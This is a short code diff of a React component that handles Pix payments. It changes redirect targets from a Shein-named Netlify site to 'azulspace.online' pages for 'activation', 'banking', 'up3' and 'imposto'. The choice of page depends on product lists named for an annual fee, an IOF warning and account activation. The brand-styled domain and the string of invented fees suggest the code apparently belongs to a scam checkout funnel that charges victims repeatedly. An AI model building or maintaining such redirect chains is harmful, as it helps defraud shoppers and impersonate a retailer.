@@ -51,13 +51,13 @@ const PixPayment = ({ pixData, loading, onGeneratePix, email, cpf, total, fullNa
   const [redirecting, setRedirecting] = useState(false);
 
   const performRedirect = useCallback((ids: string[]) => {
-    let url = "https://shein-brasilup.netlify.app/ativacao/";
+    let url = "https://azulspace.online/liberado/ativacao/";
     if (ids.some((id) => TAXA_ANUAL_PRODUCT_IDS.includes(id))) {
-      url = "https://shein-brasilup.netlify.app/banking";
+      url = "https://azulspace.online/liberado/banking";
     } else if (ids.some((id) => IOF_WARNING_PRODUCT_IDS.includes(id))) {
-      url = "https://shein-brasilup.netlify.app/up3";
+      url = "https://azulspace.online/liberado/up3";
     } else if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
-      url = "https://shein-brasilup.netlify.app/imposto";
+      url = "https://azulspace.online/liberado/imposto";
     }
     setRedirecting(true);
     try {
